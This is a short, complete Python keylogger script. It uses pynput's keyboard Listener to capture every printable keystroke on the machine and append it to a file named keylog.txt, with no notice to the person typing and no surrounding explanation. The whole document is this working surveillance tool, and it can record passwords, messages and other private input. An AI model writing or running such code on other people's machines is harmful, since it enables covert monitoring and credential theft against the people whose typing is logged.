from pynput.keyboard import Listener

def on_press(key):
    try:
        # Log the pressed key
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}\n")
    except AttributeError:
        # Handle special keys (e.g., Shift, Enter, etc.)
        pass

def main():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
